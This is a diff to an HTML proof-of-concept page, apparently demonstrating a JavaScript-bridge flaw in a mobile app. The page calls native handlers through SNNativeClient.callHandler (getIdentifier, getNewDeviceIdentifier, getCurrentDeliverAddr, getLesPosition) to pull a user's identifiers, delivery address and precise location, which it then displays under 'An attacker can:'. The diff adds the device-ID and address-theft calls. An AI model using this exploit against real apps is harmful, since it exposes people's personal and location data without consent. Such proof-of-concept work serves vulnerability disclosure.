@@ -51,21 +51,19 @@
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
     <p><span class="larger">Get Your Account Info:</span></p>
-    <p style="font-size: 15px;" id="UserName"></p>
-    <p style="font-size: 15px;" id="UserID"></p>
-    <p style="font-size: 15px;" id="PartyUID"></p>
+    <p style="font-size: 15px;" id="Identifier"></p>
+    <p style="font-size: 15px;" id="DeliverAddress"></p>
 
     <p><span class="larger">Get Your Device Info:</span></p>
     <p style="font-size: 15px;" id="ClientID"></p>
+    <p style="font-size: 15px;" id="DeviceID"></p>
 
     <p><span class="larger">Get Your Geolocation Info:</span></p>
     <p style="font-size: 15px;" id="PreciseGeolocation"></p>
     <p style="font-size: 15px;" id="Province"></p>
     <p style="font-size: 15px;" id="City"></p>
     <p style="font-size: 15px;" id="District"></p>
-    <p style="font-size: 15px;" id="Town"></p>
     <p style="font-size: 15px;" id="Street"></p>
-    <p style="font-size: 15px;" id="RegionCode"></p>
     <br><br>
     <script>
 
@@ -73,9 +71,16 @@
         var json = res;
         document.getElementById("ClientID").innerText = "Your ClientID: \n" + json.identifier;
     }
-
     setTimeout(function() {
         SNNativeClient.callHandler("getClientInfo", null, cb_getClientInfo);
+    }, 2000);
+
+    function cb_getIdentifier (res){
+        var json = res;
+        document.getElementById("Identifier").innerText = "Your Identifier: \n" + json.data;
+    }
+    setTimeout(function() {
+        SNNativeClient.callHandler("getIdentifier", null, cb_getIdentifier);
     }, 2000);
 
     function cb_getLesPosition (res){
@@ -96,6 +101,22 @@
     setTimeout(function() {
         SNNativeClient.callHandler("getLesPosition", null, cb_getLesPosition);
     }, 2000);
+
+    function cb_getNewDeviceIdentifier (res){
+        document.getElementById("DeviceID").innerText = "Your DeviceID: " + res;
+    }
+    setTimeout(function() {
+        SNNativeClient.callHandler("getNewDeviceIdentifier", null, cb_getNewDeviceIdentifier);
+    }, 2000);
+
+    function cb_getCurrentDeliverAddr (res){
+        var jsonstr = JSON.stringify(res);
+        document.getElementById("DeliverAddress").innerText = "Your DeliverAddress: \n" + jsonstr;
+    }
+    setTimeout(function() {
+        SNNativeClient.callHandler("getCurrentDeliverAddr", null, cb_getCurrentDeliverAddr);
+    }, 2000);    
+
 
     </script>
 
